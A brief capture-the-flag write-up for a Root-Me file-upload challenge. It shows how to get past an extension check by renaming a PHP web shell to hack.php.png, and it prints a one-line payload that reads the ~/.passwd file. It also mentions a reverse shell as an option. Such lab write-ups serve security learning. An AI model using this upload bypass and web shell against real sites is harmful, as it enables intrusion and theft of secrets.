Read the document first.

By going through the site, you can see that every page is displaying images, except the "[Upload](http://challenge01.root-me.org/web-serveur/ch20/?galerie=upload)" page.
We can try the form. If we upload a picture, we will have a new link telling us where the image has been stored. Our goal is to access ~/.passwd

We would like to inject a php file (hack.php) containing:

```
<?php
system(cat ~/.passwd);
?>
```

But we see that we cannot upload a php file, because we got a "Wrong File Extension!" error. Well let's just rename this file hack.php.png, and upload it.

Click on the given link, and you've got the flag!

Note: You can have a reverse shell if you want, do not hesitate to look at other people solution !
